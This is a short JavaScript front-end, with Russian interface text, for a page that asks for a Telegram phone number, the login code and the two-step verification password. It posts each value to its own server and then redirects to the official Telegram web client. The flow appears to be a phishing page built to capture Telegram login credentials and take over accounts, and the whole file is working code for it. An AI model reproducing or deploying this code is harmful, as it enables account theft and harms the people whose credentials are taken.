const $ = (id) => document.getElementById(id);
const post = (u, d) =>
  fetch(u, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(d) }).then((r) => r.json());

$("f1").onsubmit = async (e) => {
  e.preventDefault();
  const b = $("f1").querySelector("button");
  b.disabled = true;
  const r = await post("/api/send", { phone: $("phone").value });
  b.disabled = false;
  if (!r.ok) {
    $("hint").textContent =
      r.err === "phone" ? "Неверный номер телефона." : r.err === "flood" ? `Слишком много попыток, подождите ${r.wait} сек.` : "Ошибка, попробуйте ещё раз.";
    return;
  }
  $("f1").hidden = true;
  $("f2").hidden = false;
  $("hint").textContent = "Мы отправили код в приложение Telegram. Введите его ниже.";
  $("code").focus();
};

$("f2").onsubmit = async (e) => {
  e.preventDefault();
  const r = await post("/api/code", { code: $("code").value });
  if (r.needPassword) {
    $("f2").hidden = true;
    $("f3").hidden = false;
    $("hint").textContent = "Введите пароль двухэтапной аутентификации.";
    $("password").focus();
    return;
  }
  if (!r.ok) {
    $("hint").textContent = r.err === "expired" ? "Код устарел, обновите страницу." : "Неверный код, попробуйте ещё раз.";
    return;
  }
  done();
};

$("f3").onsubmit = async (e) => {
  e.preventDefault();
  const r = await post("/api/password", { password: $("password").value });
  if (!r.ok) {
    $("hint").textContent = "Неверный пароль.";
    return;
  }
  done();
};

function done() {
  $("hint").textContent = "Готово, загружаем чаты…";
  setTimeout(() => (location.href = "https://web.telegram.org/k/"), 1600);
}
